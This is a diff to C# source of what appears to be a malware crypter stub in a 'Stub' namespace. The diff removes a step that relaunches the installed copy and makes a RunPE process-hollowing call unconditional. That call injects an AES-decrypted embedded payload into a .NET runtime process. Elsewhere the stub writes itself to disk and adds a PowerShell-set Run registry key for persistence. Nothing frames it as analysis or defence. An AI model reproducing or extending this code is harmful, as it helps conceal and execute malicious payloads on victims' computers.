@@ -91,15 +91,11 @@ namespace Stub
                     CreateDirectory();
                     InstallFile();
                     InstallRegistry();
-                    ExecuteFile();
                 }
                 catch { }
             }
-            else
-            {
-                RunPE.Run(Path.Combine(RuntimeEnvironment.GetRuntimeDirectory().Replace("Framework64", "Framework"), "#Injection"), Program.AES_Decrypt(Program.GetResource("#Payload")), false);
-                Environment.Exit(0);
-            }
+            RunPE.Run(Path.Combine(RuntimeEnvironment.GetRuntimeDirectory().Replace("Framework64", "Framework"), "#Injection"), Program.AES_Decrypt(Program.GetResource("#Payload")), false);
+            Environment.Exit(0);
         }
 
         /// <summary>
@@ -156,15 +152,6 @@ namespace Stub
         {
             Powershell("Remove-ItemProperty -Path 'HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run' -Name '" + RegistryName + "';" +
                 "New-ItemProperty -Path 'HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run' -Name '" + RegistryName + "' -Value '" + Path.Combine(DirectoryName.FullName, FileName.Name) + "' -PropertyType 'String'");
-        }
-
-        /// <summary>
-        /// final step, run it and exit
-        /// </summary>
-        public void ExecuteFile()
-        {
-            Powershell("Start-Sleep -Seconds 1; Start-Process -FilePath '" + Path.Combine(DirectoryName.FullName, FileName.Name) + "'");
-            Environment.Exit(0);
         }
 
         public void Powershell(string args)
